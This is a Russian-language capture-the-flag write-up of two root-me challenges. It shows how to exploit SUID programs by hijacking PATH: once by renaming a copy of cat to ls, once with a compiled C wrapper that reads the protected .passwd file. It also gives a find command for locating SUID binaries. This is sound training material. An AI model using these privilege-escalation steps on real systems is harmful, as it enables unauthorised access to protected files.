# Обязательная часть:
Прорешать задания с платформы root-me, получить флаги и написать writeup-ы.
## [https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
## Решение
**Цель задания**  Прочесть файл .passwd.
Основная идея в том, чтобы увидеть следующие особенности:
- SUID bit у ch11 в корне
- после прочтения исходного кода ch11.c  вспомнить, что можно провести замену исполняемой утилиты через переменную окружения $PATH согласно методичке.  

P.S. Вместо подмены утилиты ls на cat можно запустить шел с привилегированными правами, но это противоречит логике задания.

```
ls -lah # для общего поиска SUID можно применить команду find / -perm -u=s -type f 2>/dev/null
cat ch11.c # вывод исходного кода программы, чтобы обнаружить какую утилиты нужнно подменить
mkdir /tmp/bie # создание дирректории для хранения подменённого эксземпляра утилиты и задания её потом как папки для поиска утилит
cp /bin/cat /tmp/bie # копирование утилиты для вывода содержимого .passwd
mv /tmp/bie/cat /tmp/bie/ls # переименование утилиты для подмены утилиты ls на cat
export PATH=/tmp/bie:$PATH # добавление папки с подменённой утилиты в переменную окружения $PATH
./ch11 # запуск утилиты
```
![[Pasted image 20241005082040.png]]
## [https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)
## Решение
**Цель задания**  Прочесть файл .passwd.
Основная идея в том, чтобы увидеть следующие особенности:
- SUID bit у ch12 в корне
- После прочтения исходного кода ch12.c   понять что старый трюк через $PATH не сработает из-за аргументов. По методичке предлагается вместо замены утилиты применить подмену утилиты через программу обёртку, которая будет игнорировать ненужные аргументы.

P.S. Вместо подмены  ls с аргументами на cat можно запустить шел с привилегированными правами через программу обёртку, но это противоречит логике задания.
```
ls -lah # для общего поиска SUID можно применить команду find / -perm -u=s -type f 2>/dev/null
cat ch12.c # вывод исходного кода программы, чтобы обнаружить какую утилиты нужнно подменить
mkdir /tmp/bie # создание дирректории для хранения подменённого эксземпляра утилиты и задания её потом как папки для поиска утилит
```

```
nano /tmp/bie/ls.c #  напишем код для программы обёртки 
```

```
#include <stdlib.h>
#include <stdio.h>

int main(){

system("cat /challenge/app-script/ch12/.passwd");

return 0;
} 
```

```
cd /tmp/bie
gcc /tmp/bie/ls.c -o /tmp/bie/ls # компиляция обёртки для подмены в $PATH
export PATH=/tmp/bie:$PATH # добавление папки с подменённой утилиты в переменную окружения $PATH
cd ~
./ch12 # запуск утилиты
```
![[Pasted image 20241005105609.png]]

# По желанию:
## Linux PrivEsc Arena THM